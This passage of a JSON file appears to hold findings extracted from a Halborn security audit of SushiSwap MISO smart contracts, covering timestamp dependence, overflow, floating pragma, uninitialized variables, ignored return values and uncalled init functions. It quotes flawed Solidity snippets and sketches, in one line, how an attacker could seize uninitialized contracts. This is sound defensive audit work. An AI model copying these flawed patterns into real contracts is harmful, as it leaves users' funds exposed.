must be greater than 0\" ); require ( liquidityAdded == 0 , \" PoolLiquidity : Liquidity already added \"); _safeTransferFrom ( address ( token ) , msg . sender , amount ); 18 157 } Listing 3: PoolLiquidity.sol (Lines 182) 180 181 182 183 function withdrawLPTokens () external returns ( uint256 liquidity ) { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity : Sender must be operator \" ); require ( block . timestamp >= unlock , \" PoolLiquidity : Liquidity is locked \"); liquidity = IERC20 ( tokenWETHPair ). balanceOf ( address ( this )) ; Listing 4: PoolLiquidity.sol (Lines 192) 189 190 191 192 function withdrawDeposits () external { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity : Sender must be operator \" ); require ( liquidityAdded == 0 , \" PoolLiquidity : Liquidity is locked \" ); require ( block . timestamp > expiry , \" PoolLiquidity : Timer has not yet expired \"); Listing 5: PoolLiquidity.sol (Lines 220,221) 219 220 221 require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity : Sender must be operator \" ); require ( block . timestamp > deadline , \" PoolLiquidity : Deposit deadline has not passed \" ); require ( block . timestamp < expiry , \" PoolLiquidity : Contract has expired \" ); Listing 6: PoolLiquidity02.sol (Lines 188) 186 187 188 function _deposit ( uint amount , address token ) private returns ( bool success ) { // CC : shouldn 't be require ( block . timestamp < deadline , if deadline is deposit deadline ? require ( block . timestamp < expiry , \" PoolLiquidity02 : Contract has expired \" ); 19 Listing 7: PoolLiquidity02.sol (Lines 217) 215 216 217 218 function withdrawLPTokens () external returns ( uint256 liquidity ) { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity02 : Sender must be operator \" ); require ( block . timestamp >= unlock , \" PoolLiquidity02 : Liquidity is locked \"); liquidity = IERC20 ( tokenPair ). balanceOf ( address ( this )) ; Listing 8: PoolLiquidity02.sol (Lines 226) 224 225 226 function withdrawDeposits () external { require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity02 : Sender must be operator \" ); require ( block . timestamp > expiry , \" PoolLiquidity02 : Timer has not yet expired \"); Listing 9: PoolLiquidity02.sol (Lines 255,256) 252 253 254 255 256 function _launchLiquidityPool () internal returns ( uint256 liquidity ) { // / GP : Could add a flag to give the option for a trustless launch require ( accessControls . hasOperatorRole ( msg . sender ) , \" PoolLiquidity02 : Sender must be operator \" ); require ( block . timestamp > deadline , \" PoolLiquidity02 : Deposit deadline has not passed \" ); require ( block . timestamp < expiry , \" PoolLiquidity02 : Contract has expired \" ); Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, 20 days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: Although block.timestamp is still in use in contract Liquidity/ PostAuctionLauncher.sol, timescales are higher than 900 seconds which is considered as safe. 21 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Low"]}, {"title": "UINT256 OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "An overflow happens when an arithmetic operation reaches the maximum or minimum size of a type. For instance here in PoolLiquidity.sol and PoolLiquidity02.sol, value received from users stored in the uint256 type. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 10: initPoolLiquidity() method in both PoolLiquidity.sol and in PoolLiquidity02.sol (Lines 126) 123 124 125 126 127 wallet = _wallet ; deadline = _deadline ; launchwindow = _launchwindow ; expiry = _deadline + _launchwindow ; locktime = _locktime ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system Reference: 22 Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: SOLVED: The Pool Liquidity contracts has been restricted to just auctions and timing variables(_expiry, _deadline, Launchwindow etc) have also been removed. 23 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "The Smart Contract Liquidity/LiquidityZAP.sol uses the floating pragma Contracts should be deployed with the same compiler version ^0.6.12. and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another For example, an outdated pragma version might introduce bugs pragma. that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Code Location: Listing 11: LiquidityZAP.sol 1 pragma solidity ^0.6.12; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version. It is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: LiquidityZAP.sol contract was removed. 24 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Low"]}, {"title": "UNINITIALIZED VARIABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "The withdrawLPTokens function in PoolLiquidity contract does use the variable unlock, as seen on Listing 12, whose the initial values is 0. The only time that variable is set is when calling the _launchLiquidityPool function as shown in Listing 13. This means that the unlock variable check on Listing 12 does always validate causing the _safeTransfer to be called. Code Location: Listing 12: PoolLiquidity.sol (Lines 182) 180 function withdrawLPTokens () external returns ( uint256 liquidity ) { require ( accessControls . hasOperatorRole ( msg . sender ) , \" 181 PoolLiquidity : Sender must be operator \" ); require ( block . timestamp >= unlock , \" PoolLiquidity : Liquidity is locked \"); liquidity = IERC20 ( tokenWETHPair ). balanceOf ( address ( this )) ; require ( liquidity > 0, \" PoolLiquidity : Liquidity must be greater than 0 \"); _safeTransfer ( tokenWETHPair , wallet , liquidity ); 182 183 184 185 186 } Listing 13: PoolLiquidity.sol (Lines 251) 249 250 251 252 liquidity = IUniswapV2Pair ( tokenWETHPair ). mint ( address ( this )); liquidityAdded = liquidityAdded . add ( liquidity ); unlock = block . timestamp + locktime ; emit LiquidityAdded ( liquidityAdded ); 25 Risk Level: Likelihood - 1 Impact - 3 Recommendations: If is recommended to initialize all internal variables on the same func- tion, either on the constructor or a custom init method. However, using unitialized variables an expecting them to have a value could cause unexpected behaviours on the execution flow. Remediation Plan: SOLVED: Calling withdrawLPTokens is not allowed without first calling finalize due to the launched required lock. The unlock variable is set on finalize 26 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "The return value of an external call is not stored in a local or state variable. In contracts liquidity/LiquidityZAP.sol, Recipes/MISORecipe01 .sol and Vault/TokenVault.sol, there are few instances where external methods are being called and return values(bool) is being ignored. Code Location: Listing 14: LiquidityZAP.sol (Lines 127) 125 126 127 uint256 outTokens = UniswapV2Library . getAmountOut ( buyAmount , reserveWeth , reserveTokens ); _WETH . transfer ( _tokenWETHPair , buyAmount ); Listing 15: LiquidityZAP.sol (Lines 171) 169 170 171 172 address to ) public returns ( uint amountA , uint amountB ) { IUniswapV2Pair ( _tokenWETHPair ). transferFrom ( msg . sender , _tokenWETHPair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = IUniswapV2Pair ( _tokenWETHPair ). burn ( to ); Listing 16: LiquidityZAP.sol (Lines 207) 205 206 207 uint256 outTokens = UniswapV2Library . getAmountOut ( amountETH , reserveWeth , reserveTokens ); _WETH . transfer ( _tokenWETHPair , amountETH ); 27 Listing 17: MISORecipe01.sol (Lines 129) 127 128 129 ISushiToken token = ISushiToken ( tokenFactory . createToken ( _name , _symbol , 1, msg . sender , tokensToMint )) ; token . approve ( address ( misoMarket ) , tokensToMarket ); Listing 18: MISORecipe01.sol 154 token . transfer ( address ( poolLiquidity ) , tokensToLiquidity ); Listing 19: MISORecipe01.sol (Lines 193) 193 194 token . transfer ( address ( farm ) , tokensToFarm ); uint256 allocPoint = 10; Listing 20: TokenVault.sol (Lines 76) 75 76 77 UserInfo storage userItem = users [ _withdrawer ]; userItem . lockedItemsWithUser . add ( _tokenAddress ); userItem . lockToItems [ _tokenAddress ]. push ( _id ); Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: Return value PARTIALLY SOLVED: LiquidityZAP.sol contract was removed. check is still missing in MISORecipe01.sol and TokenVault.sol contracts. 28 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Low"]}, {"title": "INIT FUNCTION SHOULD BE CALLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "All of the init methods present on the contracts include a locking variable that is set when the init function is fully executed. This prevents calling init a second time or by accident. The following contracts are part of the Access directory and they require to initialise the underlaying AccessControl contract or the DEFAULT_ADMIN_ROLE role and the ownership of the contract could be taken by a 3rd party:  MISOAccessControls should call initAccessControls .  MISOAccessFactory should call initMISOAccessFactory .  MISOAdminAccess should call initAccessControls.  PointList should call initPointList.  PointListFactory should call initPointListFactory. The following contracts contain init methods that initialise global vari- ables used during the contract, if those init methods are not called before interacting with the contract unexpected behaviours and the possibility of contract takeover could occur: Auction:  BatchAuction should call initAuction.  Crowdsale (OUT OF SCOPE).  DutchAuction should call initAuction.  HyperbolicAuction should call initAuction. Liquidity:  LiquidityZAP should call initUniswapZAP. 29  PoolLiquidity should call initPoolLiquidity and launchLiquidityPool (otherwise the unlock variable is uninitialized)  PoolLiquidity02 should call initPoolLiquidity. Tokens:  FixedToken should call initToken.  MintableToken should call initToken.  SushiToken should call initToken. Contracts:  MISOFarmFactory should call initMISOFarmFactory.  MISOFermenter should call _initMISOFermenter.  MISOLiquidityLauncher should call initMISOLiquidityLauncher.  MISOMarket (OUT OF SCOPE).  MISOTokenFactory should call initMISOTokenFactory. Risk Level: Likelihood - 1 Impact - 1 Recommendations: As an example, an attacker could create an automated tool that scans all contract factories for new contracts being deployed. Once a new contract is created automatically call the init method gaining control of it. It is recommended to initialize internal state variables and access controls during the creation of the contract. This would prevent an attacker to initializing the contract and taking the control of it. If the init function is the desired behaviour then a guideline on deployment should be given to the customers reminding them to always call the init function. 30 Remediation Plan: The SushiSwap team accepts the risk. 31 ", "labels": ["Halborn", "SushiSwap_MISO", "Severity: Informational"]}]